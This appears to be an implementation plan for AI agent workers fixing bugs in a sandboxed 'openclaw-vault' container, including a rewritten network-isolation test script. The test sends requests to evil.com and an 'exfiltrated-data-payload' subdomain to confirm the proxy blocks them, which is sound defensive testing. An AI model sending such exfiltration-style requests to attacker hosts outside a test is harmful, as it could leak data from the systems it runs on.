# Phase 0: Pre-Existing Bug Fixes — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Fix all pre-existing bugs in openclaw-vault so the codebase is clean before the redesign begins.

**Architecture:** No architectural changes. These are surgical fixes to existing files.

**Tech Stack:** Bash, Python, YAML, Node.js (for test replacement pattern)

**Spec reference:** Section 4.6 of `docs/superpowers/specs/2026-03-23-openclaw-vault-security-harness-design.md`

**Working directory:** `components/openclaw-vault`

---

## File Map

| Action | File | Responsibility |
|--------|------|---------------|
| Modify | `tests/test-network-isolation.sh` | Replace all `wget` calls with Node.js `http` module |
| Modify | `component.yml` (line 160) | Fix container name `openclaw-proxy` -> `vault-proxy` |
| Modify | `proxy/vault-proxy.py` (line 163) | Make `anthropic-version` header configurable via env var |
| Modify | `TODO.md` | Update to reflect fixed bugs |

---

### Task 1: Fix test-network-isolation.sh — Replace wget with Node.js http

**Files:**
- Modify: `tests/test-network-isolation.sh` (all 77 lines — full rewrite)

The test uses `wget` on lines 12, 20, 29, 38, 50, 61, 70. But `wget` was stripped from the container image for security. `scripts/verify.sh` already solved this by using Node.js `http.get()` (see verify.sh lines 67-73 for the pattern).

- [ ] **Step 1: Read the current broken test and verify.sh pattern**

Run:
```bash
cd components/openclaw-vault
head -77 tests/test-network-isolation.sh
```
Verify: All test functions use `wget`.

Run:
```bash
sed -n '65,75p' scripts/verify.sh
```
Verify: Tests 1-2 in verify.sh use `node -e "require('http')..."` — this is the replacement pattern.

- [ ] **Step 2: Rewrite test-network-isolation.sh using Node.js http module**

Replace the entire file with:

```bash
#!/usr/bin/env bash
# Test: Network isolation — vault container can only reach proxy, not internet directly
#
# Uses Node.js http module instead of wget (wget was stripped from the image for security).
# Pattern matches scripts/verify.sh checks 1-2.
set -uo pipefail

RUNTIME="${RUNTIME:-podman}"
command -v podman &>/dev/null || RUNTIME="docker"
CONTAINER="openclaw-vault"

PASS=0
FAIL=0

check() {
    local desc="$1" cmd="$2" expect_fail="${3:-false}"

    printf "  %-55s " "$desc"

    $RUNTIME exec "$CONTAINER" sh -c "$cmd" &>/dev/null && exit_code=0 || exit_code=$?

    if [ "$expect_fail" = "true" ]; then
        if [ $exit_code -ne 0 ]; then
            echo "PASS"
            PASS=$((PASS + 1))
        else
            echo "FAIL (should have been blocked)"
            FAIL=$((FAIL + 1))
        fi
    else
        if [ $exit_code -eq 0 ]; then
            echo "PASS"
            PASS=$((PASS + 1))
        else
            echo "FAIL"
            FAIL=$((FAIL + 1))
        fi
    fi
}

# Node.js HTTP helper: makes a proxy-format request via vault-proxy:8080
# Returns exit code 0 if request succeeds (any 2xx/3xx), nonzero otherwise.
# For status-specific checks, use the inline node -e form directly.
NODE_HTTP_VIA_PROXY='
const h = require("http");
const url = process.argv[1];
const parsed = new URL(url);
h.get({
    host: "vault-proxy", port: 8080,
    path: url,
    headers: { Host: parsed.hostname },
    timeout: 5000
}, r => {
    process.exit(r.statusCode >= 200 && r.statusCode < 400 ? 0 : 1);
}).on("error", () => process.exit(1))
  .on("timeout", function() { this.destroy(); process.exit(1); });
'

# Node.js helper: check if a specific status code is returned
NODE_HTTP_EXPECT_403='
const h = require("http");
const url = process.argv[1];
const parsed = new URL(url);
h.get({
    host: "vault-proxy", port: 8080,
    path: url,
    headers: { Host: parsed.hostname },
    timeout: 5000
}, r => {
    process.exit(r.statusCode === 403 ? 0 : 1);
}).on("error", () => process.exit(1))
  .on("timeout", function() { this.destroy(); process.exit(1); });
'

# Node.js helper: direct request (no proxy) — should fail because no gateway
NODE_HTTP_DIRECT='
const h = require("http");
h.get({
    host: process.argv[1], port: 80,
    path: "/",
    timeout: 5000
}, r => {
    process.exit(0);
}).on("error", () => process.exit(1))
  .on("timeout", function() { this.destroy(); process.exit(1); });
'

echo ""
echo "Network Isolation Tests"
echo "======================="
echo ""

# Check container is running
if ! $RUNTIME inspect "$CONTAINER" &>/dev/null; then
    echo "[!] Container '$CONTAINER' is not running."
    echo "    Start it first: $RUNTIME compose up -d"
    exit 1
fi

# Test 1: Container can reach proxy
check "Proxy reachable via HTTP" \
    "node -e 'require(\"http\").get(\"http://vault-proxy:8080\",r=>{process.exit(0)}).on(\"error\",()=>process.exit(1))'"

# Test 2: Blocked domain returns 403
check "evil.com blocked by proxy (403)" \
    "node -e '$NODE_HTTP_EXPECT_403' http://evil.com/"

# Test 3: Direct internet access bypassing proxy should fail (no gateway on vault-internal)
check "Direct internet blocked (no gateway)" \
    "node -e '$NODE_HTTP_DIRECT' 1.1.1.1" true

# Test 4: IP-based request blocked via proxy
check "IP-based request blocked via proxy" \
    "node -e '$NODE_HTTP_EXPECT_403' http://1.1.1.1/"

# Test 5: Case-insensitive blocking
check "Case insensitive blocking (EVIL.COM)" \
    "node -e '$NODE_HTTP_EXPECT_403' http://EVIL.COM/"

# Test 6: Long subdomain blocked (data exfil vector)
check "Long subdomain blocked (exfil vector)" \
    "node -e '$NODE_HTTP_EXPECT_403' http://exfiltrated-data-payload.evil.com/"

# Test 7: Subdomain of allowed domain (informational)
printf "  %-55s " "Subdomain edge case (evil.api.anthropic.com)"
$RUNTIME exec "$CONTAINER" sh -c "node -e '$NODE_HTTP_VIA_PROXY' http://evil.api.anthropic.com/" &>/dev/null \
    && echo "INFO — subdomain reachable (by design: subdomain matching)" \
    || echo "INFO — subdomain blocked or unreachable"

echo ""
echo "======================="
echo "Results: $PASS passed, $FAIL failed"
echo ""

if [ $FAIL -gt 0 ]; then
    echo "[!] NETWORK ISOLATION TESTS FAILED"
    exit 1
else
    echo "[+] All network isolation tests passed."
fi
```

- [ ] **Step 3: Verify the rewritten test is syntactically valid**

Run:
```bash
bash -n tests/test-network-isolation.sh
```
Expected: No output (no syntax errors).

- [ ] **Step 4: Commit**

```bash
cd components/openclaw-vault
git add tests/test-network-isolation.sh
git commit -m "fix: replace wget with Node.js http in network isolation tests

wget was stripped from the container image for security, but the test
suite still used it. All 7 tests now use Node.js http module, matching
the pattern from scripts/verify.sh.

Resolves: TODO.md test bug item"
```

---

### Task 2: Fix proxy container name in component.yml

**Files:**
- Modify: `component.yml` (line 160)

The `proxy-logs` command references `openclaw-proxy` but the actual container in `compose.yml` is named `vault-proxy`.

- [ ] **Step 1: Verify the mismatch**

Run:
```bash
cd components/openclaw-vault
grep 'container_name.*proxy' compose.yml
grep 'openclaw-proxy' component.yml
```
Expected:
- compose.yml shows `container_name: vault-proxy`
- component.yml shows `openclaw-proxy` in the proxy-logs command

- [ ] **Step 2: Fix the container name**

In `component.yml`, change line 160 from:
```yaml
    command: podman logs -f openclaw-proxy
```
to:
```yaml
    command: "${RUNTIME:-podman} logs -f vault-proxy"
```

Wait — the command also hardcodes `podman`. Check how other commands handle this. Look at the `logs` command (vault logs):

```bash
grep -A2 'id: logs' component.yml
```

If the vault logs command also hardcodes `podman`, keep consistency and just fix the container name:

```yaml
    command: podman logs -f vault-proxy
```

The Makefile handles runtime detection. If this command is invoked via `make proxy-logs`, the Makefile would handle it. Check:

```bash
grep proxy-logs Makefile 2>/dev/null || echo "No Makefile proxy-logs target"
```

- [ ] **Step 3: Apply the fix**

Change `openclaw-proxy` to `vault-proxy` in the proxy-logs command. Keep the same runtime pattern used by the vault `logs` command for consistency.

- [ ] **Step 4: Verify no other references to `openclaw-proxy` exist**

Run:
```bash
grep -r 'openclaw-proxy' . --include='*.yml' --include='*.sh' --include='*.py' --include='*.json'
```
Expected: No results (or only this file, now fixed).

- [ ] **Step 5: Commit**

```bash
git add component.yml
git commit -m "fix: correct proxy container name in component.yml

proxy-logs command referenced 'openclaw-proxy' but compose.yml names
the sidecar 'vault-proxy'. This caused the GUI proxy-logs button to
silently fail."
```

---

### Task 3: Make anthropic-version header configurable

**Files:**
- Modify: `proxy/vault-proxy.py` (line 163)

The `anthropic-version` header is hardcoded to `"2023-06-01"`. When Anthropic updates their API version, the proxy silently sends an outdated header. Make it configurable via environment variable with the current value as default.

- [ ] **Step 1: Verify the current hardcoded value**

Run:
```bash
cd components/openclaw-vault
sed -n '159,165p' proxy/vault-proxy.py
```
Expected: Line 163 shows `flow.request.headers["anthropic-version"] = "2023-06-01"`

- [ ] **Step 2: Add environment variable at module level**

Near the top of `vault-proxy.py`, after the existing constants (around line 34), add:

```python
ANTHROPIC_API_VERSION = os.environ.get("ANTHROPIC_API_VERSION", "2023-06-01")
```

- [ ] **Step 3: Replace hardcoded value with the constant**

Change line 163 from:
```python
                flow.request.headers["anthropic-version"] = "2023-06-01"
```
to:
```python
                flow.request.headers["anthropic-version"] = ANTHROPIC_API_VERSION
```

- [ ] **Step 4: Document in compose.yml**

In `compose.yml`, in the vault-proxy service environment section (around line 78), add a comment:

```yaml
      # API version header injected into Anthropic requests (update when Anthropic releases new API versions)
      - ANTHROPIC_API_VERSION=${ANTHROPIC_API_VERSION:-2023-06-01}
```

- [ ] **Step 5: Commit**

```bash
git add proxy/vault-proxy.py compose.yml
git commit -m "fix: make anthropic-version header configurable via env var

Previously hardcoded to '2023-06-01'. Now reads ANTHROPIC_API_VERSION
from the environment with the same default. Configurable in .env or
compose.yml without modifying proxy code."
```

---

### Task 4: Update TODO.md to reflect fixes

**Files:**
- Modify: `TODO.md`

- [ ] **Step 1: Update TODO.md**

Mark the test bug as resolved. Add a note about the proxy container name fix. Keep the monitoring stubs and Phase 2 VM stubs as-is (they'll be addressed in later phases).

Change the "Test Bug" section from:
```markdown
## Test Bug

- [ ] `tests/test-network-isolation.sh` tests 1-2 use `wget`...
```
to:
```markdown
## Test Bug

- [x] `tests/test-network-isolation.sh` — RESOLVED: replaced `wget` with Node.js `http` module (matches verify.sh pattern)
- [x] `component.yml` proxy-logs command — RESOLVED: fixed container name `openclaw-proxy` -> `vault-proxy`
- [x] `proxy/vault-proxy.py` anthropic-version header — RESOLVED: made configurable via `ANTHROPIC_API_VERSION` env var
```

- [ ] **Step 2: Commit**

```bash
git add TODO.md
git commit -m "docs: update TODO.md — mark Phase 0 bug fixes as resolved"
```

---

## Verification

After all 4 tasks are complete, run these checks from the repo root:

```bash
# Syntax check the rewritten test
bash -n tests/test-network-isolation.sh

# Verify no references to openclaw-proxy remain
grep -r 'openclaw-proxy' . --include='*.yml' --include='*.sh' --include='*.py' | grep -v '.git/'

# Verify anthropic-version is now using the env var
grep 'ANTHROPIC_API_VERSION' proxy/vault-proxy.py

# Verify compose.yml has the new env var
grep 'ANTHROPIC_API_VERSION' compose.yml

# Verify TODO.md has items checked off
grep '\[x\]' TODO.md
```

All checks should pass. The actual runtime test (`test-network-isolation.sh` against a live container) will be done in Phase 1 when we first run the vault.

---

## Exit Criteria

- [ ] `tests/test-network-isolation.sh` uses Node.js http module, zero `wget` references
- [ ] `component.yml` proxy-logs command references `vault-proxy` (matching compose.yml)
- [ ] `proxy/vault-proxy.py` reads `ANTHROPIC_API_VERSION` from environment
- [ ] `compose.yml` passes `ANTHROPIC_API_VERSION` to proxy container
- [ ] `TODO.md` reflects all fixes
- [ ] All changes committed with descriptive messages
- [ ] All changes pushed to the submodule remote, parent repo submodule ref updated
